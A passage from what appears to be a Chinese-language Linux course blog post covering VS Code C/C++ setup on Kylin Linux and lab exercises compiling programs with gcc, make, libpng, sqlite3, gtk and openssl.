keyword">else</span>        <span class="token builtin class-name">echo</span> <span class="token string">"Ping failed"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$ip_list_file</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Linux-gcc源码编译"><a href="#Linux-gcc源码编译" class="headerlink" title="Linux gcc源码编译"></a>Linux gcc源码编译</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>在新版本的Linux发行版中，这里选择银河麒麟，安装配置vscode，尝试配置好c&#x2F;c++的编程开发环境</p><p>在vscode官网上下载deb：<a href="https://code.visualstudio.com/docs/?dv=linux64_deb">https://code.visualstudio.com/docs/?dv=linux64_deb</a></p><p>然后安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> code_1.95.3-1731513102_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203203646070.png" alt="image-20241203203646070"></p><p>接下来配置c&#x2F;c++的开发环境</p><p>先准备好 gcc ， g++ 和 gdb</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203204406397.png" alt="image-20241203204406397"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203214320992.png" alt="image-20241203214320992"></p><p>然后在vscode扩展商店下载相关扩展</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203205157452.png" alt="image-20241203205157452"></p><p>接下来在工作区生成launch.json和tasks.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token comment">// Use IntelliSense to learn about possible attributes.</span>    <span class="token comment">// Hover to view descriptions of existing attributes.</span>    <span class="token comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>         <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"g++ - Build and debug active file"</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Enable pretty-printing for gdb"</span><span class="token punctuation">,</span>                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">true</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"C/C++: g++ build active file"</span><span class="token punctuation">,</span>            <span class="token property">"miDebuggerPath"</span><span class="token operator">:</span> <span class="token string">"/usr/bin/gdb"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"tasks"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppbuild"</span><span class="token punctuation">,</span>            <span class="token property">"label"</span><span class="token operator">:</span> <span class="token string">"C/C++: g++ build active file"</span><span class="token punctuation">,</span>            <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"/usr/bin/g++"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"-g"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span>                <span class="token string">"-o"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"options"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"$gcc"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"group"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"build"</span><span class="token punctuation">,</span>                <span class="token property">"isDefault"</span><span class="token operator">:</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"detail"</span><span class="token operator">:</span> <span class="token string">"compiler: /usr/bin/g++"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后f5调试与编译</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203214446936.png" alt="image-20241203214446936"></p><hr><h2 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h2><p>math_pic_png.c 是一个能够自动生成一张 1024*1024 的数学分形图像的c代码，生成的图像效果如 math_png_rgb.png 文件所示</p><p>尝试在 rhel 6.3、ubuntu18.04 中编译出可执行程序，并测试运行</p><p>math_pic_png.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;png.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">pixel_RGB</span> <span class="token punctuation">&#123;</span>    png_byte red<span class="token punctuation">,</span> green<span class="token punctuation">,</span> black<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> pixel_RGB<span class="token punctuation">;</span><span class="token class-name">uint8_t</span> <span class="token function">random_uint8</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">write_data_to_png</span><span class="token punctuation">(</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>png_name<span class="token punctuation">,</span>    png_uint_32 width<span class="token punctuation">,</span>    png_uint_32 height<span class="token punctuation">,</span>    png_bytepp  data<span class="token punctuation">,</span>    <span class="token keyword">int</span>         color_type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    FILE       <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>png_name<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    png_structp png <span class="token operator">=</span>        <span class="token function">png_create_write_struct</span><span class="token punctuation">(</span>PNG_LIBPNG_VER_STRING<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    png_infop info <span class="token operator">=</span> <span class="token function">png_create_info_struct</span><span class="token punctuation">(</span>png<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_init_io</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_set_IHDR</span><span class="token punctuation">(</span>        png<span class="token punctuation">,</span>        info<span class="token punctuation">,</span>        width<span class="token punctuation">,</span>        height<span class="token punctuation">,</span>        <span class="token number">8</span><span class="token punctuation">,</span>        color_type<span class="token punctuation">,</span>        PNG_INTERLACE_NONE<span class="token punctuation">,</span>        PNG_COMPRESSION_TYPE_DEFAULT<span class="token punctuation">,</span>        PNG_FILTER_TYPE_DEFAULT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_write_info</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_write_image</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_write_end</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_destroy_write_struct</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>png<span class="token punctuation">,</span> <span class="token operator">&amp;</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//===Mandelbrot ����ͼ�� </span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">RD</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">float</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">float</span> a<span class="token operator">=</span>x<span class="token operator">*</span>x<span class="token operator">-</span>y<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">768.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">512.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>x<span class="token operator">=</span>a<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token operator">></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">47</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">GR</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">float</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">float</span> a<span class="token operator">=</span>x<span class="token operator">*</span>x<span class="token operator">-</span>y<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">768.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">512.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>x<span class="token operator">=</span>a<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token operator">></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">47</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">BL</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">float</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">float</span> a<span class="token operator">=</span>x<span class="token operator">*</span>x<span class="token operator">-</span>y<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">768.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">512.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>x<span class="token operator">=</span>a<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token operator">></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">128</span><span class="token operator">-</span><span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">23</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    png_uint_32 x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    png_uint_32 png_size <span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"using defalut 1024,you can input png_size,usage:  %s png_size\n"</span><span class="token punctuation">,</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                png_size <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            png_size <span class="token operator">=</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>           <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>math_png_rgb  <span class="token operator">=</span> <span class="token string">"math_png_rgb.png"</span><span class="token punctuation">;</span>    pixel_RGB  <span class="token operator">*</span>image_data_rgb <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>png_size <span class="token operator">*</span> png_size<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pixel_RGB<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pixel_RGB <span class="token operator">*</span><span class="token operator">*</span>row_ptrs_rgb   <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>png_size<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pixel_RGB <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> y<span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> y <span class="token operator">&lt;</span> png_size<span class="token punctuation">;</span> y<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>image_data_rgb<span class="token punctuation">[</span>y <span class="token operator">*</span> png_size<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;</span> png_size<span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>red   <span class="token operator">=</span> <span class="token function">RD</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">255</span><span class="token punctuation">;</span>            row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>green <span class="token operator">=</span> <span class="token function">GR</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">255</span><span class="token punctuation">;</span>            row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>black <span class="token operator">=</span> <span class="token function">BL</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">255</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">write_data_to_png</span><span class="token punctuation">(</span>        math_png_rgb<span class="token punctuation">,</span>        png_size<span class="token punctuation">,</span>        png_size<span class="token punctuation">,</span>        <span class="token punctuation">(</span>png_bytepp<span class="token punctuation">)</span>row_ptrs_rgb<span class="token punctuation">,</span>        PNG_COLOR_TYPE_RGB<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>row_ptrs_rgb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>image_data_rgb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接编译会报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@rhel6 ex7<span class="token punctuation">]</span><span class="token comment"># gcc -o math_pix_png math_pix_png.c </span>math_pix_png.c: 在函数‘RD’中:math_pix_png.c:55: 警告：隐式声明与内建函数‘log’不兼容math_pix_png.c: 在函数‘GR’中:math_pix_png.c:60: 警告：隐式声明与内建函数‘log’不兼容math_pix_png.c: 在函数‘BL’中:math_pix_png.c:65: 警告：隐式声明与内建函数‘log’不兼容/tmp/ccPI6QFP.o: In <span class="token keyword">function</span> <span class="token variable"><span class="token variable">`</span>write_data_to_png':math_pix_png.c:<span class="token punctuation">(</span>.text+0x5b<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>png_create_write_struct<span class="token string">'math_pix_png.c:(.text+0x69): undefined reference to `png_create_info_struct'</span>math_pix_png.c:<span class="token punctuation">(</span>.text+0x7e<span class="token punctuation">)</span>: undefined reference to <span class="token variable"><span class="token variable">`</span>png_init_io'math_pix_png.c:<span class="token punctuation">(</span>.text+0xc5<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>png_set_IHDR<span class="token string">'math_pix_png.c:(.text+0xd7): undefined reference to `png_write_info'</span>math_pix_png.c:<span class="token punctuation">(</span>.text+0xe9<span class="token punctuation">)</span>: undefined reference to <span class="token variable"><span class="token variable">`</span>png_write_image'math_pix_png.c:<span class="token punctuation">(</span>.text+0xfc<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>png_write_end<span class="token string">'math_pix_png.c:(.text+0x10e): undefined reference to `png_destroy_write_struct'</span>/tmp/ccPI6QFP.o: In <span class="token keyword">function</span> <span class="token variable"><span class="token variable">`</span>RD':math_pix_png.c:<span class="token punctuation">(</span>.text+0x1c7<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>log<span class="token string">'/tmp/ccPI6QFP.o: In function `GR'</span><span class="token builtin class-name">:</span>math_pix_png.c:<span class="token punctuation">(</span>.text+0x297<span class="token punctuation">)</span>: undefined reference to <span class="token variable"><span class="token variable">`</span>log'/tmp/ccPI6QFP.o: In <span class="token keyword">function</span> <span class="token variable">`</span></span>BL<span class="token string">':math_pix_png.c:(.text+0x367): undefined reference to `log'</span>collect2: ld 返回 <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显缺头文件了，在 c 文件头部引入一个<code>&lt;math.h&gt;</code>，然后需要链接 libpng 库进行编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-o</span> math_pix_png math_pix_png.c <span class="token parameter variable">-lpng</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203215652654.png" alt="image-20241203215652654"></p><hr><h2 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h2><ol><li><p>使用gcc命令把hello-c.tar.gz中的hello.c编译成可执行程序hello，运行查看效果，并使用ldd命令查看hello调用的相关外部函数库信息、使用file命令查看hello的信息。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/141.jpg" alt="img"></p></li><li><p>把第一步编译生成的可执行程序hello删除，查看编译hello.c对应的Makefile，使用make工具编译该程序，检查编译结果。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/151.jpg" alt="img"></p></li><li><p>解压并使用make命令编译math-c.tar.gz代码，阅读该压缩包中的Makefile，尝试直接使用gcc命令把mathtest.c编译成可执行程序mathsqrtdemo</p></li></ol><p>   <img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/161.jpg" alt="img"></p><ol start="4"><li><p>使用rpm -q查询sqlite函数库以及sqlite开发库是否已经安装，如果没有安装，请从光盘安装sqlite函数库及其开发包对应的rpm文件，并查询这2个rpm软件安装包向Linux系统安装了哪些文件。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps17.jpg" alt="img"></p></li><li><p>编译调用了轻量级数据库sqlite3函数库的C程序代码。<br>sqlite-test-2目录中的源码文件sqlite-test.c为一个使用C语言结合sqlite api编写的sqlite3数据库访问程序</p><ul><li><p>使用make命令编译生成可执行程序<br>提示：编译成功后，按“sqlite-test  a.db”格式运行该程序，查看运行效果</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps18.jpg" alt="img"></p></li><li><p>阅读分析sqlite-test.c对应的Makefile文件，理解pkg-config命令的作用</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps19.jpg" alt="img"></p><p> pkg-config 的作用是帮助 gcc 命令获取关于 SQLite3 库的编译和链接信息，包括需要添加的头文件路径和库文件路径</p></li><li><p>使用make clean清除现有的编译成功的可执行程序sqlite-test</p></li></ul><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps20.jpg" alt="img"></p><ul><li><p>阅读sqlite-test-demo.tar.gz压缩包中的Makefile，对比两个版本的Makefile的写法差异。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps21.jpg" alt="img"></p><p><code>-lsqlite3</code> 选项会直接链接 SQLite3 库</p><p>前者使用 <code>pkg-config --cflags --libs sqlite3</code> 来获取 SQLite3 库的编译和链接信息</p></li></ul></li><li><p>尝试编译 hello-gtk-2.0目录中的代码并运行，阅读并理解该代码及其Makefile文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps22.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps23.jpg" alt="img"></p><p>这个 Makefile 文件的作用是编译 hello-gtk2.c 文件，并链接 gtk+-2.0 库，以生成可执行文件 hello-gtk2。使用 pkg-config 可以方便地获取所需库的编译和链接信息</p></li><li><p>aes-demo.tar.gz是一个调用openssl库进行aes加密解密的C源代码，尝试编译运行该代码，并阅读Makefile文件，分析其编译gcc命令。</p><p><img 